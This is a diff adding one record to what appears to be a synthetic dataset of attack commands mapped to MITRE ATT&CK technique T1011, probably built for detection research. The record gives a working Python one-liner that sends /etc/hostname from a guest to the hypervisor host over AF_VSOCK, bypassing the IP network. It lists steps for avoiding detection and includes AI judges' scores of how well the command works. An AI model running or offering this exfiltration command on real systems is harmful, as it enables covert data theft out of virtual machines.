@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via VMCI/virtio-vsock (guest-to-host) using AF_VSOCK to avoid the IP network path entirely, consistent with T1011.",
+  "rationale_steps": [
+    "Select vsock (AF_VSOCK) to leverage hypervisor-mediated transport.",
+    "Connect to host CID 2 on a nonstandard port (47419).",
+    "Read and send /etc/hostname over the vsock stream.",
+    "Close the connection to reduce residual indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dce5dd42",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Python one-liner with balanced quotes/parentheses and correct use of semicolons and socket API.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates /etc/hostname over AF_VSOCK to host CID 2, avoiding the IP network and aligning with an alternate medium, though it depends on vsock support and a listening service on port 47419.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:56:16.569621Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper semicolon separators, correct string quoting, and valid socket API calls.",
+        "semantic_score": 4,
+        "semantic_justification": "AF_VSOCK (virtio-vsock) does bypass the traditional IP network stack by using a guest-to-host communication channel, which aligns well with T1011's concept of exfiltrating over an alternative network medium, though vsock is more of a hypervisor communication channel than a distinct external network medium like cellular or Bluetooth, making it a reasonable but slightly imperfect fit for T1011.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-18T22:03:51.054137Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed Python one-liner with correctly balanced parentheses, quotes, and valid socket API calls.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately uses the AF_VSOCK address family to communicate with the host (CID 2), effectively bypassing the standard TCP/IP stack for exfiltration as described in T1011.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:03:52.586691Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
